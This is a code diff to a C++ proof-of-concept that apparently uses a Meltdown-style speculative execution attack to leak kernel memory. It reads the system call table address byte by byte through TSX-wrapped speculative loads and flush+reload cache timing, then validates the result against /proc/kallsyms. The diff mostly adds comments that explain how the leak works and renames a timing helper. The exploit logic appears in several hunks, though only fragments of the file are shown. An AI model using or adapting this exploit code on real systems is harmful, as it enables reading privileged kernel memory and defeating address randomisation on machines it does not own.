@@ -66,6 +66,9 @@ static inline unsigned mem_size() {
     return total_pages * getpagesize();
 }
 
+//
+// Retrieves one byte from syscall table at address ptr.
+//
 static unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* buf) {
     std::array<unsigned long, total_pages> durations;
     int min_duration = 0;
@@ -77,6 +80,10 @@ static unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* b
             __clflush(&buf[i * page_size()]);
         }
 
+        // Speculatively read byte from kernel address and execute a dependent instruction on
+        // buf[read byte * 4096] which makes L1 cache it.
+        // Subsequently, we measure access time for i={0..255} buf[i * 4096], and we assume
+        // the one with fastest access is the byte read from the address in the kernel.
         if (_xbegin() == _XBEGIN_STARTED) {
             __speculative_byte_load(ptr, buf);
             _xend();
@@ -84,10 +91,8 @@ static unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* b
             // nothing
         }
 
-        // check which cache line likely had speculative load stored by speculative execution above,
-        // by measuring access time to them and seeing which one had the fastest access.
         for (auto i = 0; i < total_pages; i++) {
-            durations[i] = __speculative_loaded_byte_probe(&buf[i * page_size()]);
+            durations[i] = __measure_load_execution(&buf[i * page_size()]);
 
             min_duration = (durations[min_duration] <= durations[i]) ? min_duration : i;
         }
@@ -116,6 +121,9 @@ static bool validate_syscall_table_entry(const void* data, const std::unordered_
     return false;
 }
 
+//
+// Checks if syscall table address actually stores a valid system call by consulting the symbol map.
+//
 static bool check_one_syscall_table_address(uintptr_t target_address, char* mem, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
     size_t address_size = sizeof(uintptr_t);
     unsigned char buffer[address_size];
@@ -126,7 +134,9 @@ static bool check_one_syscall_table_address(uintptr_t target_address, char* mem,
     return validate_syscall_table_entry(buffer, symbol_map);
 }
 
-
+//
+// Builds a map of pointer to symbol from /proc/kallsyms
+//
 static std::unordered_map<uintptr_t, std::string> build_symbol_map() {
     std::unordered_map<uintptr_t, std::string> symbol_map;
 
